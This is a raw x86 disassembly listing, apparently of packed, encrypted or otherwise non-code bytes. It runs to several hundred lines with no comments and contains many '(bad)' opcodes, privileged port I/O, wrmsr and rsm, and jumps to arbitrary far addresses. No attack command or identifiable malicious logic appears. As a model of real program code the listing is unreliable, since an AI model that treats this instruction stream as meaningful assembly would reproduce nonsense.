  41092d:	mov    ebp,0x236b3ede
  410932:	jle    0x4108fc
  410934:	aaa    
  410935:	fs mov al,bl
  410938:	add    bl,dl
  41093a:	imul   edi,DWORD PTR [ebp+0x68043cc4],0xffffffb7
  410941:	inc    ecx
  410942:	push   ds
  410943:	outs   dx,BYTE PTR ds:[esi]
  410944:	nop
  410945:	int    0x75
  410947:	int    0x5c
  410949:	ret    
  41094a:	call   FWORD PTR [ebx]
  41094c:	mov    eax,eax
  41094e:	push   0x5d
  410950:	and    al,0xf2
  410952:	sub    DWORD PTR [edx+0x3a],eax
  410955:	jnp    0x4109a4
  410957:	mov    ecx,0x4cf0f56a
  41095c:	test   al,0xa6
  41095e:	(bad)  
  41095f:	mov    bh,0xa9
  410961:	add    al,0x7
  410963:	addr16 push esi
  410965:	sub    al,al
  410967:	clc    
  410968:	dec    esp
  410969:	xor    al,0x58
  41096b:	dec    esi
  41096c:	in     al,dx
  41096d:	rol    BYTE PTR [ebp-0x3588000e],0x93
  410974:	in     eax,dx
  410975:	lds    edi,FWORD PTR [ebp-0x7]
  410978:	shr    DWORD PTR [edi+0xf41d668],cl
  41097e:	mov    bl,0xb7
  410980:	jnp    0x4109be
  410982:	cs jge 0x41090c
  410985:	in     al,dx
  410986:	aaa    
  410987:	out    0x8f,eax
  410989:	push   ds
  41098a:	mov    dl,0xd9
  41098c:	icebp  
  41098d:	stc    
  41098e:	(bad)  
  41098f:	and    al,0xf4
  410991:	jbe    0x41093b
  410993:	dec    ecx
  410994:	mov    ds,WORD PTR [esi+0x3b8bb4cc]
  41099a:	xor    edi,0xe85bb0bd
  4109a0:	in     al,0xe9
  4109a2:	call   0xf5e1:0x6e775522
  4109a9:	push   ecx
  4109aa:	jecxz  0x410a27
  4109ac:	jne    0x410993
  4109ae:	pop    esp
  4109af:	mov    ds:0xa0977b22,al
  4109b4:	xchg   esi,eax
  4109b5:	pop    ecx
  4109b6:	jbe    0x4109eb
  4109b8:	jecxz  0x41096e
  4109ba:	scas   eax,DWORD PTR es:[edi]
  4109bb:	retf   
  4109bc:	call   0x7673:0xa0fc991a
  4109c3:	jb     0x410a04
  4109c5:	pusha  
  4109c6:	popf   
  4109c7:	xor    DWORD PTR [edx-0x4],esi
  4109ca:	cmp    BYTE PTR [edi],bl
  4109cc:	dec    esp
  4109cd:	dec    ebx
  4109ce:	sar    DWORD PTR [ecx],cl
  4109d0:	cld    
  4109d1:	adc    BYTE PTR [ecx+0x5d],0x9c
  4109d5:	stos   BYTE PTR es:[edi],al
  4109d6:	jmp    0x4109cb
  4109d8:	push   edi
  4109d9:	mov    ah,0xec
  4109db:	sbb    cl,BYTE PTR [ebx]
  4109dd:	jo     0x410a08
  4109df:	cld    
  4109e0:	xchg   BYTE PTR [edx-0x74e719f9],al
  4109e6:	test   eax,0x7de1139f
  4109eb:	stos   DWORD PTR es:[edi],eax
  4109ec:	ror    esi,1
  4109ee:	fwait
  4109ef:	xchg   ecx,eax
  4109f0:	cmp    BYTE PTR [esi+ebp*1],dh
  4109f3:	icebp  
  4109f4:	pop    edx
  4109f5:	mov    al,0x9e
  4109f7:	xor    edx,DWORD PTR [esi+0x63]
  4109fa:	sub    BYTE PTR [esi+0x3a2d091],bh
  410a00:	mov    al,ds:0x984f664d
  410a05:	fwait
  410a06:	imul   ebx,DWORD PTR [eax-0x62fd55fa],0x65
  410a0d:	and    BYTE PTR [eax+eiz*2-0x80],0xfa
  410a12:	jne    0x410a53
  410a14:	mov    ebx,0xbef76b48
  410a19:	mov    dl,0x4c
  410a1b:	pop    ebx
  410a1c:	popf   
  410a1d:	jno    0x410a3c
  410a1f:	cmp    eax,esp
  410a21:	jo     0x410a5b
  410a23:	out    dx,eax
  410a24:	mov    bh,0x2f
  410a26:	push   eax
  410a27:	sbb    DWORD PTR [esi],ebx
  410a29:	ins    DWORD PTR es:[edi],dx
  410a2a:	inc    ecx
  410a2b:	pop    ecx
  410a2c:	sub    eax,DWORD PTR [esi-0x28]
  410a2f:	cmc    
  410a30:	jne    0x4109f3
  410a32:	jmp    0x410a87
  410a34:	mov    cl,0xc2
  410a36:	fwait
  410a37:	add    al,0x31
  410a39:	addr16 test eax,0x2a901dbb
  410a3f:	in     eax,0xbe
  410a41:	retf   
  410a42:	or     BYTE PTR [ebp+0x6e544e21],dl
  410a48:	xchg   esp,eax
  410a49:	icebp  
  410a4a:	inc    edi
  410a4b:	jecxz  0x410a6c
  410a4d:	stos   BYTE PTR es:[edi],al
  410a4e:	mov    edx,0x7f341f20
  410a53:	out    0xb6,eax
  410a55:	es pushf 
  410a57:	xor    al,0x9b
  410a59:	mov    cl,0x3e
  410a5b:	xor    BYTE PTR ds:0xc8fe16b,ch
  410a61:	cmp    al,0x51
  410a63:	std    
  410a64:	sub    dl,ah
  410a66:	pop    ss
  410a67:	bnd jmp 0x410a35
  410a6a:	mov    al,0xb7
  410a6c:	inc    edx
  410a6d:	mov    esi,0x9d119ea6
  410a72:	lahf   
  410a73:	xchg   edi,eax
  410a74:	xchg   ebx,eax
  410a75:	or     eax,0x9252d9c4
  410a7a:	and    BYTE PTR [esi-0x44],dh
  410a7d:	mov    ebp,0x94619a08
  410a82:	out    0xec,eax
  410a84:	pop    ecx
  410a85:	add    ah,BYTE PTR [edx+0x3d5e54e1]
  410a8b:	shr    DWORD PTR [esi],cl
  410a8d:	nop    DWORD PTR [ebx]
  410a90:	icebp  
  410a91:	jbe    0x410a8e
  410a93:	mov    bl,0xa5
  410a95:	jp     0x410a9c
  410a97:	push   edx
  410a98:	jns    0x410a65
  410a9a:	adc    cl,BYTE PTR [esi]
  410a9c:	mov    dh,BYTE PTR [edx-0x60]
  410a9f:	xor    al,0x9b
  410aa1:	dec    ebx
  410aa2:	push   0x85120054
  410aa7:	fbld   TBYTE PTR [ecx-0x62]
  410aaa:	jnp    0x410aa2
  410aac:	adc    esp,DWORD PTR [edi-0x759d0e29]
  410ab2:	clc    
  410ab3:	add    ah,al
  410ab5:	mov    edx,DWORD PTR [ecx-0x2c]
  410ab8:	push   ebp
  410ab9:	sar    BYTE PTR [edx],0x49
  410abc:	pop    ds
  410abd:	mov    WORD PTR [edi-0x7a],ss
  410ac0:	int3   
  410ac1:	out    dx,eax
  410ac2:	and    dh,BYTE PTR [ebp+0x123659b]
  410ac8:	out    0x2e,eax
  410aca:	or     DWORD PTR ds:0x1e04e108,esp
  410ad0:	cli    
  410ad1:	sti    
  410ad2:	(bad)  
  410ad3:	mov    ds:0x52ec2f1a,al
  410ad8:	mov    ds:0xcc186c23,eax
  410add:	or     al,0x84
  410adf:	sbb    dh,BYTE PTR ds:0xcd3962d8
  410ae5:	sbb    BYTE PTR [esp+eiz*2],ch
  410ae8:	jo     0x410a8a
  410aea:	lock jecxz 0x410ab4
  410aed:	in     eax,0x43
  410aef:	hlt    
  410af0:	ds call 0x963f:0x47143dbd
  410af8:	or     eax,0x28bcdb70
  410afd:	sub    eax,0xd7637ea1
  410b02:	cmp    BYTE PTR [esi-0x2cf2b8c],dl
  410b08:	sahf   
  410b09:	ror    DWORD PTR [ebp-0x523661aa],0xba
  410b10:	stos   DWORD PTR es:[edi],eax
  410b11:	or     DWORD PTR [edx+0x54],esp
  410b14:	test   BYTE PTR [eax],0x5d
  410b17:	adc    eax,0x86252d77
  410b1c:	add    DWORD PTR [edx-0x18],ecx
  410b1f:	push   edi
  410b20:	xor    eax,0x492334a8
  410b25:	xor    eax,0x220d4382
  410b2a:	push   ebx
  410b2b:	ja     0x410b82
  410b2d:	sti    
  410b2e:	or     cl,BYTE PTR [ebp-0x35]
  410b31:	sbb    eax,0x883160c3
  410b36:	mov    al,0x6b
  410b38:	nop
  410b39:	int    0x49
  410b3b:	lahf   
  410b3c:	scas   eax,DWORD PTR es:[edi]
  410b3d:	data16 xlat BYTE PTR ds:[ebx]
  410b3f:	out    dx,al
  410b40:	popf   
  410b41:	call   0x4c14:0x180a9bc1
  410b48:	rcl    bh,0x89
  410b4b:	adc    esp,eax
  410b4d:	or     eax,0xa201e7cd
  410b52:	and    ebp,DWORD PTR [esi+0x23104147]
  410b58:	mov    bh,0x92
  410b5a:	pop    es
  410b5b:	push   eax
  410b5c:	mov    bh,0xef
  410b5e:	fs or  BYTE PTR fs:[esi],cl
  410b62:	xchg   esi,eax
  410b63:	inc    esp
  410b64:	add    DWORD PTR [edi+0x65],esi
  410b67:	clc    
  410b68:	pop    es
  410b69:	or     DWORD PTR [ebx-0x1cefa890],0x80d9106b
  410b73:	xchg   ebp,eax
  410b74:	xor    DWORD PTR [ecx],ecx
  410b76:	rol    BYTE PTR [ecx],cl
  410b78:	and    DWORD PTR es:[ecx-0x7e],ebx
  410b7c:	cwde   
  410b7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b7e:	cs lock dec eax
  410b81:	aam    0x99
  410b83:	lock and eax,0xda3f9721
  410b89:	xchg   edx,eax
  410b8a:	sub    eax,0xa27106dc
  410b8f:	rcr    BYTE PTR [ecx],cl
  410b91:	push   0x37a40080
  410b96:	mov    ds:0xd254ed3a,eax
  410b9b:	push   eax
  410b9c:	frstor [ebx+0x5ad5ad1]
  410ba2:	mov    cl,0x12
  410ba4:	int3   
  410ba5:	xchg   bl,ah
  410ba7:	push   edx
  410ba8:	adc    ecx,DWORD PTR [esi-0x311b8e4]
  410bae:	and    DWORD PTR [eax+0x6fe2687b],edx
  410bb4:	pop    ebp
  410bb5:	xchg   ecx,eax
  410bb6:	xchg   ebp,eax
  410bb7:	stc    
  410bb8:	dec    edx
  410bb9:	jg     0x410c0f
  410bbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bbc:	mov    ebx,0x313ecee2
  410bc1:	mov    ebp,0x6e796380
  410bc6:	cmp    eax,0x8e9064dd
  410bcb:	arpl   WORD PTR [ebx-0x1a],si
  410bce:	mov    cl,0xef
  410bd0:	mov    eax,ds:0x6a749b00
  410bd5:	outs   dx,BYTE PTR ds:[esi]
  410bd6:	scas   al,BYTE PTR es:[edi]
  410bd7:	add    DWORD PTR [ecx],0x5
  410bda:	cs mov ah,0xd0
  410bdd:	popa   
  410bde:	dec    edx
  410bdf:	mov    edx,0x4cea2ada
  410be4:	xor    edi,DWORD PTR [ebx-0x5c50fc1a]
  410bea:	pop    ebx
  410beb:	pop    eax
  410bec:	rsm    
  410bee:	or     BYTE PTR [ebp-0x18],dh
  410bf1:	xchg   esp,eax
  410bf2:	bound  ebp,QWORD PTR [ecx-0x32]
  410bf5:	cmp    DWORD PTR [ecx-0x11a9fdc8],esp
  410bfb:	rcr    BYTE PTR [ebp-0x5b05f226],0xbc
  410c02:	add    al,0xdf
  410c04:	dec    edx
  410c05:	mov    ebp,DWORD PTR [edx]
  410c07:	sbb    eax,0xb589ab3c
  410c0c:	push   cs
  410c0d:	or     BYTE PTR [ecx+0x4d2bf50],0x77
  410c14:	mov    edx,0x7f7585ad
  410c19:	or     BYTE PTR [eax-0x7f],al
  410c1c:	out    dx,eax
  410c1d:	sbb    edi,DWORD PTR [ecx-0x4f]
  410c20:	shl    DWORD PTR [ebp*4-0x5c0349e8],0x12
  410c28:	dec    edx
  410c29:	push   ds
  410c2a:	je     0x410bd7
  410c2c:	es mov ebx,0x14985706
  410c32:	mov    ah,0x75
  410c34:	imul   esp,DWORD PTR [edx-0x57],0x60
  410c38:	ins    BYTE PTR es:[edi],dx
  410c39:	mov    ebp,0xd6d7fd8f
  410c3e:	xor    al,0xfd
  410c40:	jle    0x410bc3
  410c42:	inc    ebp
  410c43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c44:	sar    DWORD PTR ds:0x8a20202b,1
  410c4a:	pop    ds
  410c4b:	pop    esi
  410c4c:	bound  eax,QWORD PTR [ebx]
  410c4e:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  410c50:	xor    al,al
  410c52:	in     eax,dx
  410c53:	retf   
  410c54:	rsm    
  410c56:	sub    esi,esi
  410c58:	loopne 0x410c3b
  410c5a:	sbb    DWORD PTR [ecx],esp
  410c5c:	cld    
  410c5d:	inc    esi
  410c5e:	bound  edx,QWORD PTR [edi+ebp*4+0x20187f7e]
  410c65:	test   al,0x5f
  410c67:	xor    BYTE PTR [edx],dl
  410c69:	ds inc edx
  410c6b:	aas    
  410c6c:	sub    eax,0x6d727156
  410c71:	adc    esp,edi
  410c73:	adc    edx,edi
  410c75:	xor    al,0xda
  410c77:	xchg   al,dl
  410c79:	add    eax,0x625d9882
  410c7e:	xor    eax,0xa800cfed
  410c83:	and    BYTE PTR [ebp+eax*8-0x6a],al
  410c87:	mov    ecx,0x568666ca
  410c8c:	(bad)  [ecx]
  410c8e:	mov    edx,0xd4a1f8b1
  410c93:	dec    ebp
  410c94:	push   edx
  410c95:	xor    ch,BYTE PTR [ecx]
  410c97:	dec    ebx
  410c98:	push   ecx
  410c99:	mov    al,0xaa
  410c9b:	loope  0x410c75
  410c9d:	ret    0xe736
  410ca0:	icebp  
  410ca1:	xchg   ebp,edi
  410ca3:	inc    edi
  410ca4:	(bad)  [ebx]
  410ca6:	gs push esi
  410ca8:	(bad)  
  410ca9:	sar    DWORD PTR [ebx-0x1c2a72f4],cl
  410caf:	mov    eax,0xec58a287
  410cb4:	jg     0x410c60
  410cb6:	push   edx
  410cb7:	adc    eax,0xcfc0df5b
  410cbc:	dec    edi
  410cbd:	xchg   esp,eax
  410cbe:	mov    al,ds:0x26e2e9a9
  410cc3:	out    dx,eax
  410cc4:	cmp    DWORD PTR [eax-0x6],ebp
  410cc7:	jle    0x410c9b
  410cc9:	jbe    0x410c6a
  410ccb:	fcom   QWORD PTR [edx]
  410ccd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410cce:	and    ch,ch
  410cd0:	fistp  DWORD PTR [esi+0x319c7079]
  410cd6:	stos   DWORD PTR es:[edi],eax
  410cd7:	inc    esp
  410cd8:	push   ecx
  410cd9:	jmp    0xb132a506
  410cde:	mov    al,0x87
  410ce0:	xchg   edi,eax
  410ce1:	mov    BYTE PTR [eax+0x5fe899dc],al
  410ce7:	push   edx
  410ce8:	fisub  DWORD PTR [edi-0x5fea171]
  410cee:	or     dl,bl
  410cf0:	dec    ecx
  410cf1:	mov    ds:0xb9a257e3,al
  410cf6:	jp     0x410cf3
  410cf8:	lahf   
  410cf9:	das    
  410cfa:	aaa    
  410cfb:	adc    dl,BYTE PTR [esi]
  410cfd:	popf   
  410cfe:	mov    al,0x6c
  410d00:	nop
  410d01:	jg     0x410cc8
  410d03:	xchg   esi,eax
  410d04:	sub    dl,dh
  410d06:	je     0x410cbd
  410d08:	mov    eax,ds:0x8156dae7
  410d0d:	cdq    
  410d0e:	cli    
  410d0f:	(bad)  
  410d10:	ficom  WORD PTR [ebp-0x1365725b]
  410d16:	jg     0x410d09
  410d18:	sbb    al,0x2a
  410d1a:	aam    0x68
  410d1c:	mov    ds:0x5db8dab8,eax
  410d21:	shr    BYTE PTR [esi-0x47],0xed
  410d25:	lods   al,BYTE PTR ds:[esi]
  410d26:	and    BYTE PTR [esi-0x15],bl
  410d29:	aas    
  410d2a:	ins    DWORD PTR es:[di],dx
  410d2c:	fdiv   st,st(4)
  410d2e:	pop    ds
  410d2f:	pop    ss
  410d30:	in     eax,0x33
  410d32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d33:	sti    
  410d34:	rol    edx,0xce
  410d37:	call   0xe44ba184
  410d3c:	in     eax,dx
  410d3d:	mov    DWORD PTR [esi+edi*1+0x5e13a450],ebx
  410d44:	or     al,0x4f
  410d46:	arpl   WORD PTR [esi],sp
  410d48:	mov    edx,0x724217ed
  410d4d:	and    eax,edx
  410d4f:	bound  ecx,QWORD PTR [ebp-0x3569fdc1]
  410d55:	pop    eax
  410d56:	or     al,0xd0
  410d58:	(bad)  
  410d59:	cwde   
  410d5a:	pop    edx
  410d5b:	xchg   esi,eax
  410d5c:	cmp    eax,0xae975322
  410d61:	mov    ah,0x17
  410d63:	popa   
  410d64:	cld    
  410d65:	in     al,dx
  410d66:	or     ebp,DWORD PTR [eax+0xc5c7cbb]
  410d6c:	mov    ds:0xc3c1be79,eax
  410d71:	sub    eax,eax
  410d73:	outs   dx,BYTE PTR ds:[esi]
  410d74:	dec    eax
  410d75:	mov    ecx,0xfff39b9c
  410d7a:	lods   al,BYTE PTR ds:[esi]
  410d7b:	outs   dx,DWORD PTR ds:[esi]
  410d7c:	and    DWORD PTR [ebx-0x2704b34a],esp
  410d82:	push   esp
  410d83:	in     eax,0xb5
  410d85:	mov    BYTE PTR [edi+0x74399ed8],bl
  410d8b:	push   0x43
  410d8d:	mov    ch,BYTE PTR [ebx+ecx*1]
  410d90:	jmp    0x95d3:0x524ff7f6
  410d97:	in     al,dx
  410d98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d99:	dec    ebp
  410d9a:	jb     0x410d3b
  410d9c:	xchg   esp,eax
  410d9d:	adc    al,0x8a
  410d9f:	and    eax,0xdc1c0792
  410da4:	adc    bl,ch
  410da6:	mov    DWORD PTR [eax],ecx
  410da8:	lock mov ebx,0x83e7340d
  410dae:	lds    esp,FWORD PTR [ebp-0x71]
  410db1:	xor    al,0x9c
  410db3:	out    0x85,eax
  410db5:	dec    eax
  410db6:	pushf  
  410db7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410db8:	test   al,0x7b
  410dba:	out    0xf4,al
  410dbc:	call   0x2c:0xf1ceddb3
  410dc3:	mov    dl,0xde
  410dc5:	jno    0x410df2
  410dc7:	int3   
  410dc8:	in     al,dx
  410dc9:	or     al,0xf3
  410dcb:	fs push edi
  410dcd:	xor    eax,0xab4c9da9
  410dd2:	(bad)  
  410dd3:	arpl   WORD PTR es:[eax],bx
  410dd6:	jp     0x410d74
  410dd8:	fcmovb st,st(6)
  410dda:	cmp    al,0x4f
  410ddc:	pop    edx
  410ddd:	mov    dl,0x55
  410ddf:	fstp   TBYTE PTR [ebp+0x6dbf3218]
  410de5:	sub    eax,DWORD PTR [esi]
  410de7:	out    0x24,eax
  410de9:	xor    eax,0x388fc4fc
  410dee:	sub    eax,0x6761996e
  410df3:	aam    0xbd
  410df5:	mov    WORD PTR [ecx-0x1838c35e],ss
  410dfb:	ror    ch,0x71
  410dfe:	ja     0x410db6
  410e00:	or     DWORD PTR ss:[esp+eax*8+0x46],ebp
  410e05:	cmc    
  410e06:	dec    eax
  410e07:	mov    eax,ds:0x4b7703c
  410e0c:	adc    ebx,DWORD PTR [edx]
  410e0e:	popa   
  410e0f:	adc    bl,al
  410e11:	jmp    0x410e77
  410e13:	cmp    eax,0x6ddb910b
  410e18:	scas   eax,DWORD PTR es:[edi]
  410e19:	inc    edx
  410e1a:	sub    al,0xfa
  410e1c:	inc    ecx
  410e1d:	das    
  410e1e:	sahf   
  410e1f:	inc    eax
  410e20:	mov    BYTE PTR [esi+0x64],bl
  410e23:	je     0x410dd0
  410e25:	(bad)  
  410e26:	data16 add al,0x5c
  410e29:	inc    edi
  410e2a:	jmp    0xb459d493
  410e2f:	and    dh,BYTE PTR [ebp+0x73]
  410e32:	out    0xc1,al
  410e34:	fwait
  410e35:	or     edi,DWORD PTR [ebp+0x77]
  410e38:	ret    
  410e39:	mov    edi,0xf3ed4c84
  410e3e:	pop    eax
  410e3f:	rcr    ecx,cl
  410e41:	jb     0x410e07
  410e43:	jo     0x410dca
  410e45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e46:	and    ch,BYTE PTR [ebx-0x10]
  410e49:	cmp    eax,0x9be2a636
  410e4e:	or     ebp,esi
  410e50:	or     DWORD PTR [ebx+0x1f],ebp
  410e53:	adc    bl,BYTE PTR [edx+0x54541938]
  410e59:	cmp    BYTE PTR [ebx+eiz*1],bl
  410e5c:	push   cs
  410e5d:	jecxz  0x410ec8
  410e5f:	xchg   ebp,eax
  410e60:	and    dh,BYTE PTR [ecx-0x5bc3ef82]
  410e66:	inc    ebp
  410e67:	jle    0x410ebf
  410e69:	add    esi,eax
  410e6b:	pop    edi
  410e6c:	mul    BYTE PTR [esi+0x2d]
  410e6f:	push   edi
  410e70:	iret   
  410e71:	and    eax,0x5e33a730
  410e76:	xor    DWORD PTR [esi+eiz*2],edi
  410e79:	inc    ecx
  410e7a:	mov    cl,dl
  410e7c:	popa   
  410e7d:	(bad)  
  410e7e:	mov    esi,0xc359cb9b
  410e83:	fwait
  410e84:	cdq    
  410e85:	wrmsr  
  410e87:	push   esp
  410e88:	sar    BYTE PTR [edx+edi*2+0x572de3c1],1
  410e8f:	push   edi
  410e90:	test   eax,0x31dde7ca
  410e95:	xchg   edx,eax
  410e96:	or     al,0x1a
  410e98:	aad    0x5e
  410e9a:	sub    ebx,ebx
  410e9c:	je     0x410ec2
  410e9e:	pop    esp
  410e9f:	xchg   ebx,eax
  410ea0:	nop
  410ea1:	addr16 inc esi
  410ea3:	push   esi
  410ea4:	mov    eax,ds:0x6153ba9e
  410ea9:	xor    dl,BYTE PTR [eax]
  410eab:	jns    0x410ea4
  410ead:	dec    ebx
  410eae:	jp     0x410e9a
  410eb0:	ins    DWORD PTR es:[edi],dx
  410eb1:	xchg   ecx,eax
  410eb2:	sub    BYTE PTR [eax],0x2f
  410eb5:	sbb    ah,BYTE PTR [ebx]
  410eb7:	into   
  410eb8:	jo     0x410e68
  410eba:	aaa    
  410ebb:	clc    
  410ebc:	xor    eax,DWORD PTR [eax]
  410ebe:	mov    ecx,0x7d6e7972
  410ec3:	jmp    0xc858:0xce34697e
  410eca:	loopne 0x410eb8
  410ecc:	ins    BYTE PTR es:[edi],dx
  410ecd:	push   0x70280d26
  410ed2:	push   esi
  410ed3:	retf   
  410ed4:	push   ebp
  410ed5:	pop    ebp
  410ed6:	jb     0x410f00
  410ed8:	nop
  410ed9:	mov    dl,0xd9
  410edb:	or     ah,ch
  410edd:	xchg   DWORD PTR [ebp+0x58e7103d],ecx
  410ee3:	pop    ds
  410ee4:	ret    
  410ee5:	inc    esp
  410ee6:	test   eax,0x3083ec9e
  410eeb:	sti    
  410eec:	mov    bh,0xb5
  410eee:	push   ss
  410eef:	sbb    BYTE PTR [ebx],0x36
  410ef2:	mov    eax,ds:0x282aab76
  410ef7:	cmp    BYTE PTR [ebx+0x5de951e],ah
  410efd:	daa    
  410efe:	adc    edi,ecx
  410f00:	in     al,dx
  410f01:	imul   ecx,DWORD PTR [edx+eax*8],0xffffffe6
  410f05:	push   esp
  410f06:	pop    es
  410f07:	mov    eax,0xf1f90a2e
  410f0c:	mov    ah,0xaa
  410f0e:	(bad)  
  410f0f:	in     eax,0x46
  410f11:	add    al,0x17
  410f13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f14:	leave  
  410f15:	and    eax,0x273d076
  410f1a:	pop    edi
  410f1b:	fisubr DWORD PTR [edx+ebp*8]
  410f1e:	data16 int3 
  410f20:	popa   
  410f21:	or     eax,0x974d3fc8
  410f26:	aas    
  410f27:	lods   al,BYTE PTR ds:[esi]
  410f28:	mov    esi,0x31180ca2
  410f2d:	lods   eax,DWORD PTR ds:[esi]
  410f2e:	outs   dx,BYTE PTR ds:[esi]
  410f2f:	outs   dx,DWORD PTR ds:[esi]
  410f30:	add    al,ah
  410f32:	dec    BYTE PTR [ebp+0x54]
  410f35:	rcr    ch,cl
  410f37:	jmp    0xe5c1a85d
  410f3c:	push   ss
  410f3d:	cmp    al,BYTE PTR [edi-0xe8732e0]
  410f43:	bound  ecx,QWORD PTR [edi-0x76]
  410f46:	mov    WORD PTR [ebx],cs
  410f48:	icebp  
  410f49:	mov    ah,0xbf
  410f4b:	fadd   QWORD PTR [ebx+0x43]
  410f4e:	gs xor al,0xe
  410f51:	mov    al,ds:0xe1d1d69e
  410f56:	sub    dh,BYTE PTR [ecx-0x67b52c03]
  410f5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f5d:	xor    ch,BYTE PTR [ebp+0x85affed]
  410f63:	jne    0x410f43
  410f65:	jmp    edi
  410f67:	inc    ebx
  410f68:	xor    BYTE PTR [ebx+edx*8],ah
  410f6b:	sub    al,0xb7
  410f6d:	retf   
  410f6e:	xchg   esp,eax
  410f6f:	mov    eax,0x4bf395a4
  410f74:	shl    edi,1
  410f76:	repnz pop eax
  410f78:	lods   al,BYTE PTR ds:[esi]
  410f79:	fdivr  st(1),st
  410f7b:	jb     0x410f77
  410f7d:	lods   eax,DWORD PTR ds:[esi]
  410f7e:	lods   al,BYTE PTR ds:[esi]
  410f7f:	jb     0x410ffe
  410f81:	sbb    BYTE PTR [eax],dl
  410f83:	mov    fs,WORD PTR [ecx]
  410f85:	sub    eax,0xd223ee40
  410f8a:	sub    ah,BYTE PTR [eax-0x39]
  410f8d:	in     al,dx
  410f8e:	jbe    0x410f1f
  410f90:	inc    ecx
  410f91:	lods   eax,DWORD PTR ds:[esi]
  410f92:	inc    esi
  410f93:	mov    al,ds:0x76a113a4
  410f98:	adc    BYTE PTR [esi-0x18],ah
  410f9b:	fild   QWORD PTR [ecx-0x1]
  410f9e:	div    DWORD PTR [edi]
  410fa0:	push   es
  410fa1:	xchg   edi,eax
  410fa2:	jbe    0x410ffd
  410fa4:	ss pusha 
  410fa6:	cmc    
  410fa7:	adc    eax,0x73f0d901
  410fac:	mov    esi,0x5b3ea562
  410fb1:	add    esi,DWORD PTR [ebp+0x30c07cf4]
  410fb7:	cwde   
  410fb8:	sbb    al,0x4f
  410fba:	sub    DWORD PTR [edx+0x41],0xffffffa5
  410fbe:	test   DWORD PTR [ebx+0x17],edx
  410fc1:	mov    esi,0xbf009fe9
  410fc6:	dec    DWORD PTR [esi]
  410fc8:	mov    edx,0x9ecb61ee
  410fcd:	xchg   ebx,eax
  410fce:	sbb    DWORD PTR [esi],edi
  410fd0:	ja     0x410f66
  410fd2:	sub    ah,BYTE PTR [ebx+0x11ef005e]
  410fd8:	outs   dx,DWORD PTR ds:[esi]
  410fd9:	jae    0x41100b
  410fdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410fdc:	lods   al,BYTE PTR ds:[esi]
  410fdd:	cmp    BYTE PTR [ebx],bh
  410fdf:	push   esp
  410fe0:	rol    BYTE PTR [ecx+0x6f0c34cd],cl
  410fe6:	inc    eax
  410fe7:	mov    edx,0xea51d1ad
  410fec:	cmp    DWORD PTR [ecx-0x53],0xe3cc1ca8
  410ff3:	or     BYTE PTR [esi],dh
  410ff5:	inc    ecx
  410ff6:	adc    esi,0xffffff9c
  410ff9:	sbb    eax,0x8ed7ee3c
  410ffe:	std    
  410fff:	xor    edx,eax
  411001:	mov    eax,0x3f32a440
  411006:	int    0x29
  411008:	rol    DWORD PTR [eax],1
  41100a:	out    0x5b,eax
  41100c:	in     eax,dx
  41100d:	cmp    ch,BYTE PTR [eax]
  41100f:	push   0x7a23555c
  411014:	jmp    0x411009
  411016:	dec    esi
  411017:	inc    ebp
  411018:	lea    edi,[ecx+ebx*1+0x13]
  41101c:	imul   ebp,DWORD PTR [ecx],0xa20a6cdf
  411022:	adc    DWORD PTR [ecx+0x240814b3],eax
  411028:	in     al,0x1e
  41102a:	inc    edi
  41102b:	pusha  
  41102c:	adc    BYTE PTR [edx-0x4d],bl
  41102f:	or     eax,0x97e4d35f
  411034:	jmp    0x1ec18194
  411039:	cli    
  41103a:	mov    al,ds:0xa4695cbf
  41103f:	sahf   
  411040:	fdivr  st,st(3)
  411042:	adc    edx,DWORD PTR [edi]
  411044:	or     DWORD PTR [eax+ebp*4+0x20],ecx
  411048:	data16 add BYTE PTR [eax],ch
  41104b:	pop    esi
  41104c:	xchg   ebx,eax
  41104d:	pop    ecx
  41104e:	mov    esp,0x4a7bd242
  411053:	xchg   esi,eax
  411054:	sbb    edi,DWORD PTR [edi+0x12]
  411057:	pop    edx
  411058:	rcl    cl,cl
  41105a:	inc    ebx
  41105b:	mov    esi,0x1b999c0c
  411060:	adc    eax,0xc81a4b18
  411065:	inc    esp
  411066:	add    al,0x6a
  411068:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411069:	mov    ebx,edi
  41106b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41106c:	xor    esi,DWORD PTR [esi]
  41106e:	fld    QWORD PTR [ebp-0x15]
  411071:	push   eax
  411072:	jp     0x411072
  411074:	xchg   edi,eax
  411075:	inc    ecx
  411076:	xchg   ebp,eax
  411077:	mov    edx,0xa21a2d80
  41107c:	sbb    ebp,edx
  41107e:	stc    
  41107f:	mov    ebx,0x123351bb
  411084:	push   ebp
  411085:	xchg   ebx,eax
  411086:	call   0xceaf2949
  41108b:	jns    0x411038
  41108d:	ret    
  41108e:	lahf   
  41108f:	add    ebx,ecx
  411091:	push   cs
  411092:	dec    eax
  411093:	pop    esp
  411094:	push   0xaa5e68fd
  411099:	jb     0x411104
  41109b:	adc    DWORD PTR [esi],edi
  41109d:	dec    eax
  41109e:	sar    DWORD PTR [edx+0x4d8d1dc4],0xab
  4110a5:	jmp    0x4bd236ce
  4110aa:	add    al,0x27
  4110ac:	dec    edi
  4110ad:	xor    DWORD PTR [eax-0x7e],0xfef7c27f
  4110b4:	das    
  4110b5:	out    0x72,al
  4110b7:	loop   0x41104f
  4110b9:	and    al,0x57
  4110bb:	out    0x46,eax
  4110bd:	outs   dx,DWORD PTR ds:[esi]
  4110be:	int    0x96
  4110c0:	in     eax,0x85
  4110c2:	cmp    al,0x1e
  4110c4:	jbe    0x4110d7
  4110c6:	adc    esi,DWORD PTR [edi+0xc]
  4110c9:	jmp    0x4110f8
  4110cb:	and    dl,BYTE PTR [edx+0xe39e92d]
  4110d1:	sahf   
  4110d2:	mov    edx,0x5d20fa92
  4110d7:	loope  0x41111f
  4110d9:	int3   
